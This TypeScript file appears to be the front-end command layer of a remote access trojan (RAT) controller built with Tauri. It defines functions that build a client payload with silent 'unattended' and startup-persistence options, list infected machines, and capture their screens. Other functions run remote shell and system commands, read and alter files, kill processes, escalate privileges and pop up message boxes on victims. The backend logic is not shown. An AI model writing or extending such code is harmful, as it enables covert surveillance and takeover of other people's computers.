import { invoke } from "@tauri-apps/api/tauri";
import { RATClient, RATState } from "../../types";

export const startServerCmd = async (port: string): Promise<string> => {
  return invoke("start_server", { port });
};

export const buildClientCmd = async (
  ip: string,
  port: string,
  unattended: boolean,
  mutexEnabled: boolean,
  mutex: string,
  startup: boolean
): Promise<void> => {
  return invoke("build_client", {
    ip,
    port,
    mutexEnabled,
    mutex,
    unattendedMode: unattended,
    startup,
  });
};

export const fetchClientsCmd = async (): Promise<RATClient[]> => {
  let clients: RATClient[] = await invoke("fetch_clients");
  return clients;
};

export const fetchStateCmd = async (): Promise<RATState> => {
  return invoke("fetch_state");
};

export const fetchClientCmd = async (
  id: string | undefined
): Promise<RATClient> => {
  return invoke("fetch_client", { id });
};

export const manageClientCmd = async (
  id: string | undefined,
  run: string
): Promise<void> => {
  return invoke("manage_client", { id: id, run });
};

export const takeScreenshotCmd = async (
  id: string | undefined,
  display: number
): Promise<void> => {
  return invoke("take_screenshot", { id, display });
};

export const handleSystemCommandCmd = async (
  id: string | undefined,
  run: string
): Promise<void> => {
  return invoke("handle_system_command", { id, run });
};

export const readFilesCmd = async (
  id: string | undefined,
  run: string,
  path: string
): Promise<Array<string>> => {
  return invoke("read_files", { id, run, path });
};

export const manageFileCmd = async (
  id: string | undefined,
  run: string,
  file: string
): Promise<void> => {
  return invoke("manage_file", { id, run, file });
};

export const processListCmd = async (id: string | undefined): Promise<void> => {
  return invoke("process_list", { id });
};

export const killProcessCmd = async (
  id: string | undefined,
  pid: number,
  name: string
): Promise<void> => {
  return invoke("kill_process", { id, pid, name });
};

export const manageShellCmd = async (
  id: string | undefined,
  run: string
): Promise<string> => {
  return invoke("manage_shell", { id, run });
};

export const executeShellCommandCmd = async (
  id: string | undefined,
  run: string
): Promise<void> => {
  return invoke("execute_shell_command", { id, run });
};

export const visitWebsiteCmd = async (
  id: string | undefined,
  url: string
): Promise<void> => {
  return invoke("visit_website", { id, url });
};

export const handleElevateCmd = async (
  id: string | undefined
): Promise<void> => {
  return invoke("elevate_client", { id });
};

export const testMessageBoxCmd = async (
  title: string,
  message: string,
  button: string,
  icon: string
): Promise<void> => {
  return invoke("test_messagebox", { title, message, button, icon });
};

export const sendMessageBoxCmd = async (
  id: string | undefined,
  title: string,
  message: string,
  button: string,
  icon: string
): Promise<void> => {
  return invoke("send_messagebox", { id, title, message, button, icon });
};
